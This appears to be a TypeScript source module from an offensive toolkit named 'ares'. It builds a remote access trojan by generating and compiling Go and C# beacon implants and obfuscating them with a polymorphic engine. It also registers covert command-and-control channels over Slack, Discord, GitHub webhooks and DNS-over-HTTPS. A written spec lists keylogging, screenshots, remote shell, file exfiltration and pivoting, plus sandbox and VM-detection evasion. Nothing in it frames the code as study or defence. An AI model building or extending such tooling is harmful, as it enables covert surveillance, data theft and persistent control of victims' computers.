/**
 * @module ares/rat_builder
 * Modular RAT — NativeImplantGenerator + CovertC2 + PolymorphicEngine.
 */
import * as path from "node:path"
import { NativeImplantGenerator } from "../implant_gen.ts"
import { CovertC2Engine } from "../covert_c2.ts"
import { PolymorphicEngine } from "../polymorphic.ts"
import { LegitC2Server, InMemoryTransport } from "../c2_platform.ts"
import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
import { c2Material, step, type ExecStep } from "./_integrations.ts"

export interface RatBuilderResult {
  ratId: string
  artifacts: string[]
  protocol: string
  channels: string[]
  steps: ExecStep[]
  built: boolean
  summary: string
}

export async function buildRat(opts: {
  live?: boolean
  protocol?: "custom_binary" | "https" | "dns" | "websocket"
  c2Host?: string
  c2Port?: number
}): Promise<RatBuilderResult> {
  liveRequired("ares_rat_builder", opts)
  const ratId = `rat_${Date.now()}`
  const protocol = opts.protocol ?? "custom_binary"
  const c2Host = opts.c2Host ?? "127.0.0.1"
  const c2Port = opts.c2Port ?? 8443
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  const channels: string[] = []

  const { mailboxUrl, keyHex, session } = c2Material()
  const mailbox = `http://${c2Host}:${c2Port}/mailbox`
  const gen = new NativeImplantGenerator()
  let goSrc = gen.generateGo(mailboxUrl || mailbox, keyHex, session, { intervalSeconds: 45, jitter: 0.35 })

  const poly = new PolymorphicEngine()
  const polyResult = poly.generatePolymorphic(goSrc, 3)
  steps.push(step("polymorphic", true, JSON.stringify(polyResult).slice(0, 300)))
  goSrc = poly.transformCode(goSrc, Date.now() % 1000)

  const dir = ensureAresDir("rat")
  const goBuild = await gen.buildGo(goSrc, dir, { goos: process.platform === "win32" ? "windows" : "linux" })
  if (goBuild.artifact) artifacts.push(goBuild.artifact)
  steps.push(step("go_beacon", goBuild.status === "built", goBuild.note ?? goBuild.status, goBuild.artifact))

  const cs = gen.generateCsharp(mailboxUrl || mailbox, keyHex, session)
  const csBuild = await gen.buildCsharp(cs.program, cs.csproj, dir)
  if (csBuild.artifact) artifacts.push(csBuild.artifact)
  steps.push(step("csharp_beacon", csBuild.status === "built", csBuild.note ?? csBuild.status, csBuild.artifact))

  const c2 = new CovertC2Engine()
  c2.slackChannel("ares_slack", `https://${c2Host}/hooks/slack`)
  c2.discordChannel("ares_discord", `https://discord.com/api/webhooks/ares`)
  c2.githubChannel("ares_github", "org/repo", 1)
  c2.dohChannel("ares_doh", "cloudflare-dns.com")
  for (const [name] of c2.channels) channels.push(name)
  writeArtifact("rat", `${ratId}_channels.json`, JSON.stringify([...c2.channels.values()], null, 2))

  const server = new LegitC2Server({ checkpointPath: path.join(dir, `${ratId}_c2.jsonl`) })
  server.registerBeacon(ratId, new InMemoryTransport(), { host: c2Host, user: session })
  steps.push(step("c2_mailbox", true, `beacon ${ratId} registered`))

  const protoSpec = writeArtifact("rat", `${ratId}_protocol.json`, JSON.stringify({
    ratId, protocol, c2: { host: c2Host, port: c2Port, mailbox: mailboxUrl },
    features: ["keylog", "screenshot", "shell", "file_exfil", "pivot", "meterpreter_compat"],
    evasion: ["sandbox_sleep", "vm_detect", "domain_check", "polymorphic"],
    sessionKey: keyHex.slice(0, 16),
  }, null, 2))
  artifacts.push(protoSpec)

  const built = goBuild.status === "built" || csBuild.status === "built"
  return {
    ratId,
    artifacts,
    protocol,
    channels,
    steps,
    built,
    summary: built
      ? `RAT builder: ${ratId} compiled (${protocol}) + ${channels.length} covert channel(s)`
      : `RAT builder: ${ratId} sources + C2 channels — install Go/dotnet for binary build`,
  }
}

export default { buildRat }
